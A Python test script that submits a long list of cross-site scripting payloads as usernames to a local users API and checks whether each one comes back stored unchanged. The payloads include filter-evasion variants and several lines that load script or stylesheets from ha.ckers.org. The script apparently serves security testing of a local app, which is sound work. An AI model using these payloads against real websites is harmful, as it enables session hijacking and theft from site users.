import requests

url = "http://localhost:8000/users"

test_cases = [
    "%3C",
    "%3Cimg/src=%3Dx+onload=alert(2)%3D",
    "%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%48%69%22%29%3b%3c%2f%73%63%72%69%70%74%3e",
    "'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert(0x0000EB)%3C/script%3E",
    "48e71%3balert(1)//503466e3",
    "';confirm('XSS')//1491b2as",
    "a29b1%3balert(888)//a62b7156d82",
    "<scr&#x9ipt>alert('XSS')</scr&#x9ipt>",
    "No Tags < >",
    '"onmouseover%3dprompt(941634)',
    "%f6%22%20onmouseover%3dprompt(941634)%20",
    '" onerror=alert()1 a="',
    'style=xss:expression(alert(1))',
    '<input type=text value=“XSS”>',
    'A” autofocus onfocus=alert(“XSS”)//',
    '<input type=text value=”A” autofocus onfocus=alert(“XSS”)//”>',
    '<a href="javascript:alert(1)">ssss</a>',
    '+ADw-p+AD4-Welcome to UTF-7!+ADw-+AC8-p+AD4-',
    '+ADw-script+AD4-alert(+ACc-utf-7!+ACc-)+ADw-+AC8-script+AD4-',
    '+ADw-script+AD4-alert(+ACc-xss+ACc-)+ADw-+AC8-script+AD4-',
    '<%00script>alert(‘XSS’)<%00/script>',
    '<%script>alert(‘XSS’)<%/script>',
    '<%tag style=”xss:expression(alert(‘XSS’))”>',
    '<%tag    onmouseover="(alert(\'XSS\'))"> is invalid. <%br />',
    '</b style="expr/**/ession(alert(\'vulnerable\'))">',
    '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\'>"><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>',
    '\'\';!--"<XSS>=&{()}',
    '<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>',
    '<IMG SRC="javascript:alert(\'XSS\');">',
    '<IMG SRC=javascript:alert(\'XSS\')>',
    '<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',
    '<IMG SRC=`javascript:alert("RSnake says, \'XSS\'")`>',
    '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',
    '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
    '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>',
    '<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>',
    '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>',
    '<IMG SRC="jav	ascript:alert(\'XSS\');">',
    '<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">',
    '<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">',
    '<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">',
    '<IMG\nSRC\n=\n"\nj\na\nv\na\ns\nc\nr\ni\np\nt\n:\na\nl\ne\nr\nt\n(\n\'\nX\nS\nS\n\'\n)\n"',
    '<IMG SRC=" &#14;  javascript:alert(\'XSS\');">',
    '<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
    '<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>',
    '<SCRIPT/SRC="http://ha.ckers.org/xss.js"></SCRIPT>',
    '<<SCRIPT>alert("XSS");//<</SCRIPT>',
    '<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>',
    '<SCRIPT SRC=//ha.ckers.org/.j>',
    '<iframe src=http://ha.ckers.org/scriptlet.html <',
    '<IMG SRC="javascript:alert(\'XSS\')"',
    '<SCRIPT>a=/XSS/\nalert(a.source)</SCRIPT>',
    '\";alert(\'XSS\');//',
    '</TITLE><SCRIPT>alert("XSS");</SCRIPT>',
    '<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">',
    '<BODY BACKGROUND="javascript:alert(\'XSS\')">',
    '<BODY ONLOAD=alert(\'XSS\')>',
    '<IMG DYNSRC="javascript:alert(\'XSS\')">',
    '<IMG LOWSRC="javascript:alert(\'XSS\')">',
    '<BGSOUND SRC="javascript:alert(\'XSS\');">',
    '<BR SIZE="&{alert(\'XSS\')}">',
    '<LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER>',
    '<LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">',
    '<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">',
    '<STYLE>@import\'http://ha.ckers.org/xss.css\';</STYLE>',
    '<META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet">',
    '<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>',
    '<XSS STYLE="behavior: url(xss.htc);">',
    '<STYLE>li {list-style-image: url("javascript:alert(\'XSS\')");}</STYLE><UL><LI>XSS',
    '<IMG SRC=\'vbscript:msgbox("XSS")\'>',
    '¼script¾alert(¢XSS¢)¼/script¾',
    '<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(\'XSS\');">',
    '<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">',
    '<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(\'XSS\');">',
    '<IFRAME SRC="javascript:alert(\'XSS\');"></IFRAME>',
    '<FRAMESET><FRAME SRC="javascript:alert(\'XSS\');"></FRAMESET>',
    '<TABLE BACKGROUND="javascript:alert(\'XSS\')">',
    '<TABLE><TD BACKGROUND="javascript:alert(\'XSS\')">',
    '<DIV STYLE="background-image: url(javascript:alert(\'XSS\'))">',
    '<DIV STYLE="background-image:\\0075\\0072\\006C\\0028\'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029\'\\0029">',
    '<DIV STYLE="background-image: url(&#1;javascript:alert(\'XSS\'))">',
    '<DIV STYLE="width: expression(alert(\'XSS\'));">',
    '<STYLE>@im\\port\'\\ja\\vasc\\ript:alert("XSS")\';</STYLE>',
    '<IMG STYLE="xss:expr/*XSS*/ession(alert(\'XSS\'))">',
    '<XSS STYLE="xss:expression(alert(\'XSS\'))">',
    r'exp/*<A STYLE=\'no\xss:noxss("*//*");\nxss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))\'>',
    '<STYLE TYPE="text/javascript">alert(\'XSS\');</STYLE>',
    '";alert("XSS");//',
    '";alert("XSS")//',
    ';alert("XSS");//',
    ';alert("XSS")//',
    '/;alert("XSS")//',
    '<SCRIPT>alert("XSS")</SCRIPT>',
    '</TITLE><SCRIPT>alert("XSS");</SCRIPT>',
    '"";!--"<XSS>=&{()}'
]

passed = 0
failed = 0

for case in test_cases:
    data = {
        "username": case,
        "password": "",
        "api_key": "a"
    }
    response = requests.post(url, json=data)
    print(f"Test case: {case}")
    print("Status code:", response.status_code)
    print("Response body:", response.json())
    if response.ok:
        response_data = response.json()
        user_id = response_data["user_id"]
        response = requests.get(url)
        response_data = response.json()
        expected = data["username"]
        actual = [user["username"] for user in response_data if user["id"] == user_id][0]
        print(f"test passed: {expected == actual}, expected: {expected}, actual: {actual}")
        if expected == actual:
            passed += 1
        else:
            failed += 1
    print("-" * 50)

print("XSS DETECTION: ")
print(f"PASSED: {passed}")
print(f"FAILED: {failed}")
print("-" * 50)